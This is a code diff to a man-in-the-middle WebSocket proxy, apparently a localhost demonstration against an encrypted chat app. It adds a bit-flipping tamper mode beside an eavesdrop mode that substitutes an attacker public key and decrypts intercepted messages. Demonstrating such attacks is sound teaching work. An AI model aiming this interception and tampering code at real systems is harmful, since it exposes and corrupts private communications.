@@ -73,6 +73,10 @@ log = logging.getLogger("mitm_proxy")
 
 REAL_SERVER_WS = "ws://localhost:8765/ws"
 
+# 
+
+MODE = "eavesdrop"
+
 attacker_priv, attacker_pub = generate_rsa_keypair()
 attacker_pub_b64 = export_public_key_b64(attacker_pub)
 
@@ -83,6 +87,12 @@ recovered_keys: dict[frozenset, bytes] = {}
 def pair_key(a: str, b: str) -> frozenset:
     return frozenset({a, b})
 
+
+def tamper_ciphertext(ciphertext_b64: str) -> str:
+    """Flips a single bit in the ciphertext."""
+    raw = bytearray(base64.b64decode(ciphertext_b64))
+    raw[0] ^= 0x01  # flip the lowest bit of the first byte
+    return base64.b64encode(bytes(raw)).decode()
 
 class ConnectionState:
     def __init__(self):
@@ -100,6 +110,21 @@ class ConnectionState:
 async def handle_upstream_message(state: ConnectionState, data: dict) -> dict:
     msg_type = data.get("type")
 
+    # tampering attack
+    if MODE == "tamper":
+        # Handshake messages pass through completely untouched - both
+        # parties establish a genuine, uncompromised shared key. We only
+        # ever touch already-encrypted "message" frames.
+        if msg_type == "message":
+            original = data.get("ciphertext", "")
+            tampered = tamper_ciphertext(original)
+            log.info(f"[TAMPER] Intercepted message {data.get('to')} <- (in transit)")
+            log.info(f"[TAMPER]   original ciphertext:  {original}")
+            log.info(f"[TAMPER]   tampered ciphertext:  {tampered}  (1 bit flipped)")
+            data["ciphertext"] = tampered
+        return data
+    
+    # eavesdropping attack
     if msg_type == "pubkey":
         peer = data.get("to")
         real_key = data.get("publicKey")
@@ -129,14 +154,16 @@ async def handle_upstream_message(state: ConnectionState, data: dict) -> dict:
     elif msg_type == "message":
         peer = data.get("to")
         key = recovered_keys.get(pair_key(state.my_username, peer))
+        ciphertext = data.get("ciphertext", "")
         if key:
             try:
-                plaintext = aes_gcm_decrypt(key, data.get("ciphertext", ""), data.get("iv", ""))
+                plaintext = aes_gcm_decrypt(key, ciphertext, data.get("iv", ""))
                 log.info(f"[MITM] Decrypted message {state.my_username} -> {peer}: {plaintext!r}")
             except Exception as e:
                 log.info(f"[MITM] Have a key for {state.my_username}<->{peer} but decryption failed: {e}")
-        else:
-            log.info(f"[MITM] No recovered key yet for {state.my_username}<->{peer}, message stays unreadable to us")
+        else:   
+            log.info(f"[MITM] No recovered key yet for {state.my_username}<->{peer}. "
+                    f"Ciphertext (unreadable to us): {ciphertext}")
 
     return data
 
@@ -188,8 +215,10 @@ def create_app() -> web.Application:
 
 if __name__ == "__main__":
     log.info("=" * 70)
-    log.info("MITM PROXY running on ws://localhost:8766")
-    log.info(f"Attacker public key (substituted for real users'): {attacker_pub_b64[:50]}...")
-    log.info("Point victims at ws://localhost:8766 instead of :8765 to 'attack' them")
+    log.info(f"PROXY running on ws://localhost:8766, MODE = {MODE}")
+    if MODE == "eavesdrop":
+        log.info(f"Attacker public key (substituted for real users'): {attacker_pub_b64[:50]}...")
+    else:
+        log.info("Real handshake passes through untouched. Message ciphertexts get 1 bit flipped in transit.")
     log.info("=" * 70)
     web.run_app(create_app(), host="localhost", port=8766)
